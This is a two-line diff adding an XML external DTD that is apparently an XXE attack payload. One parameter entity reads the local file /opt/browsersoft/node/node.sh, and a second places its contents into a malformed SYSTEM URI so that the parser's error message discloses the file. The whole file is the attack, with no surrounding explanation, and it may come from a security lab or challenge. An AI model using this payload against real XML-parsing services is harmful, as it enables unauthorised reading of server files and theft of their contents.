@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/browsersoft/node/node.sh">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
